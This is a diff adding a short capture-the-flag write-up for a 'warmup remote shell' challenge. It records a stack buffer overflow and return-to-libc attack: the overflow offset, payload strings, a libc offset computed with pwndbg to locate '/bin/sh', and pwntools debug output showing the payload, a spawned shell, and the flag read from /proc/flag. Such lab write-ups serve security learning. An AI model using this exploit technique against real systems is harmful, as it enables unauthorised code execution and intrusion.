@@ -1,0 +1,48 @@
+The program is leaking system for us
+
+nc pwnremote.threatsims.com 9000
+Warmup remote shell.id
+system @ 0xf7d72830
+
+The overflow is after 45 bytes
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCBBBB
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC\x30\x38\xe0\xfe/bin/sh
+
+First I tried to just put /bin/sh on the stack but that will never works since system wants an address!
+Then I just used pwndbg search to find /bin/sh in libc and calculate the offset from system.
+
+system address 0xf7d42830
+system address 0xf7d0b830
+
+search "/bin/sh"
+libc-2.31.so    0xf7e8f352 '/bin/sh'  
+libc-2.31.so    0xf7e58352 '/bin/sh
+
+calculating the offset like: 
+0xf7e8f352 - 0xf7d42830 = 14CB22 and 
+0xf7e58352 - 0xf7d0b830 = 14CB22
+
+Therefore "/bin/sh" = system address + 14CB22
+
+
+[DEBUG] Sent 0x39 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000020  41 41 41 41  41 41 41 41  43 43 43 43  30 f8 e0 f7  │AAAA│AAAA│CCCC│0···│
+    00000030  46 46 46 46  52 c3 f5 f7  0a                        │FFFF│R···│·│
+    00000039
+[*] Switching to interactive mode
+> $ id
+[DEBUG] Sent 0x3 bytes:
+    b'id\n'
+[DEBUG] Received 0x1e bytes:
+    b'uid=2005 gid=2005 groups=2005\n'
+uid=2005 gid=2005 groups=2005
+$ cat /proc/flag
+[DEBUG] Sent 0xf bytes:
+    b'cat /proc/flag\n'
+[DEBUG] Received 0x18 bytes:
+    b'TS{TheObstacleIstheWay}\n'
+TS{TheObstacleIstheWay}
+$  
+
